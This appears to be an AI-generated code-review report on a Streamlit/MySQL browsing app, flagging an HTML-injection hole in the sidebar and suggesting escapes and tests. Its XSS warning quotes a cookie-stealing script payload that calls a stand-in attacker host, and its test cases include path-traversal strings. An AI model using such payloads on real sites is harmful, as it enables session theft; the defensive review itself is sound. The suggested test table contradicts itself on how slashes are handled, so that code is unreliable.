---
phase: 01-foundation-browsing
reviewed: 2026-04-23T20:30:00Z
depth: standard
files_reviewed: 7
files_reviewed_list:
  - streamlit_app.py
  - app/adapters/db/mysql.py
  - app/services/result_normalizer.py
  - app/services/ufs_service.py
  - app/pages/settings.py
  - app/pages/browse.py
  - app/components/export_dialog.py
findings:
  critical: 0
  warning: 1
  info: 4
  total: 5
status: issues_found
---

# Phase 01: Code Review Report (Re-review after 01-REVIEW-FIX iteration 1)

**Reviewed:** 2026-04-23T20:30:00Z
**Depth:** standard
**Files Reviewed:** 7
**Status:** issues_found

## Summary

Re-review of the Phase 1 foundation browsing layer following the code-review-fix
pass that patched CR-01 and WR-01 through WR-05.

**All six previously-blocking issues are confirmed resolved.** The patches are
correct and no regressions were introduced by the fixes themselves.

One new warning was found during the broader scan: the database name string is
interpolated directly into a `markdown(..., unsafe_allow_html=True)` call in
`streamlit_app.py`. Because `active_db` is sourced from settings (a user-
controlled YAML file), a maliciously crafted DB name can inject arbitrary HTML
into the sidebar. This was not visible in the previous review pass but is
surfaced now as a direct consequence of reviewing the HTML context around the
health indicator.

The four info items from the original review are unchanged and are restated
for completeness.

---

## Verification of Previously-Blocking Issues

| ID | Finding | Status |
|----|---------|--------|
| CR-01 | `_safe_table()` called before every SQL f-string | **Fixed** — `tbl = _safe_table(_TABLE)` at lines 74, 92, 158; used at all four SQL sites (77, 96, 161, 179). |
| WR-01 | `db_name` in all three `@st.cache_data` signatures | **Fixed** — `list_platforms` (line 66), `list_parameters` (line 84), `fetch_cells` (line 115) all have `db_name: str = ""`. All call sites in browse.py pass `db_name=db_name` or `db_name=adapter.config.name` (lines 154, 173, 243, 352, 412). |
| WR-02 | `logger.debug` before swallow in `get_schema` | **Fixed** — `except Exception as exc:` with `logger.debug("get_pk_constraint failed for table %s: %s", t, exc)` at lines 60-61 of mysql.py. |
| WR-03 | `try/except (TypeError, ValueError)` around `pd.isna` in `_coerce` | **Fixed** — lines 299-303 of result_normalizer.py mirror the safe pattern from `is_missing`. |
| WR-04 | `_sanitize_filename` removes `/` and `\` before charset clamp | **Fixed** — line 52 of export_dialog.py: `name.replace("..", "").replace("/", "").replace("\\", "")`. The three replacements are independent of step order. |
| WR-05 | Unconditional `browse.tab` writes in all three `with tab:` blocks | **Fixed** — no assignments to `browse.tab` remain inside the three `with` blocks. `browse.tab` is set only by `_load_state_from_url` (line 77) and is read via `session_state.get` at line 533. |

---

## Warnings

### WR-06: DB name injected into `unsafe_allow_html` markdown without escaping (streamlit_app.py)

**File:** `streamlit_app.py:134`

**Issue:** The health-indicator markdown renders `active_db` (the database name
string) directly inside an f-string that is passed to
`st.sidebar.markdown(..., unsafe_allow_html=True)`:

```python
st.sidebar.markdown(
    f'<span style="color:{dot_color};">●</span> {active_db or "No DB"}',
    unsafe_allow_html=True,
)
```

`active_db` is read from `st.session_state["active_db"]`, which is populated
from `settings.databases[i].name` — a string stored in `config/settings.yaml`
and edited via the Settings page. Anyone with access to the Settings page (the
entire intranet team per D-09) can set a database name to a string such as
`<script>fetch('http://attacker/'+document.cookie)</script>` and cause that
script to execute in every session that renders the sidebar, because
`unsafe_allow_html=True` passes the raw string to the browser without
sanitisation.

`dot_color` is safe — it is a hardcoded literal selected by an if/elif/else
chain with no user input — but `active_db` is not.

**Fix:** Either (a) HTML-escape `active_db` before interpolation using Python's
stdlib `html.escape`, or (b) switch to a safe rendering approach that does not
require `unsafe_allow_html=True`:

Option A — escape the user-controlled string (minimal change):
```python
import html as _html  # add to top-level imports

st.sidebar.markdown(
    f'<span style="color:{dot_color};">●</span> {_html.escape(active_db or "No DB")}',
    unsafe_allow_html=True,
)
```

Option B — split into two calls so no raw HTML is needed for the label:
```python
st.sidebar.markdown(
    f'<span style="color:{dot_color};">●</span>',
    unsafe_allow_html=True,
)
st.sidebar.caption(active_db or "No DB")
```

Option B is preferred because it eliminates the `unsafe_allow_html` surface
entirely for the label portion. Option A is acceptable if the single-line
rendering is required for layout reasons.

---

## Info

### IN-01: Duplicate `@st.cache_resource` factory in `browse.py` and `streamlit_app.py`

**File:** `app/pages/browse.py:37-50` and `streamlit_app.py:37-52`

**Issue:** Two separate `@st.cache_resource` functions with identical logic
(`_get_db_adapter` in browse.py and `get_db_adapter` in streamlit_app.py)
both exist. Streamlit caches `@st.cache_resource` per function object, so
these two functions produce separate cache entries. The engine is constructed
twice when both are called for the same `db_name`.

**Fix:** Extract the shared factory into a dedicated module (e.g.,
`app/adapters/db/factory.py`) and import it in both files.


### IN-02: Unused import `build_llm_adapter` retained in `settings.py`

**File:** `app/pages/settings.py:26`

**Issue:** `from app.adapters.llm.registry import build_adapter as build_llm_adapter`
is imported but never used. The inline comment says "unused in Phase 1 Test
helper; retained for Phase 2" — intentional scaffolding, but it triggers `ruff`
lint warnings.

**Fix:** Add a `noqa` suppression if you want to keep it, or remove it and
re-add in Phase 2:
```python
from app.adapters.llm.registry import build_adapter as build_llm_adapter  # noqa: F401 — Phase 2
```


### IN-03: No test for `_sanitize_filename` in export_dialog.py

**File:** `app/components/export_dialog.py:30-62`

**Issue:** `_sanitize_filename` is a security-relevant function (path-traversal
defence, T-07-01/02) with seven explicit rules and multiple edge cases. It has
no corresponding unit test. Given the known risk of step-ordering bugs (WR-04,
now fixed) and the safety importance of the function, a test covering `None`,
`".."`, path traversal sequences, empty-after-strip, and the 128-char truncation
is warranted.

**Fix:** Add `tests/components/test_export_dialog.py`:
```python
import pytest
from app.components.export_dialog import _sanitize_filename

@pytest.mark.parametrize("inp, expected", [
    (None,               "ufs_export"),
    ("",                 "ufs_export"),
    ("..",               "ufs_export"),
    ("../etc/passwd",    "etcpasswd"),
    ("../../secret",     "secret"),
    ("valid_name",       "valid_name"),
    ("a" * 200,          "a" * 128),
    ("..foo..",          "foo"),
    ("foo/bar",          "foo_bar"),
    ("foo\\bar",         "foo_bar"),
])
def test_sanitize_filename(inp, expected):
    assert _sanitize_filename(inp) == expected
```


### IN-04: `requirements.txt` — `pandas>=3.0` without upper bound

**File:** `requirements.txt`

**Issue:** `pandas>=3.0` has no upper bound. A future `pandas>=4.0` release
with breaking changes could affect `pd.NA` semantics or `pd.read_sql_query`
without warning.

**Fix:**
```
pandas>=3.0,<4.0
```

---

_Reviewed: 2026-04-23T20:30:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
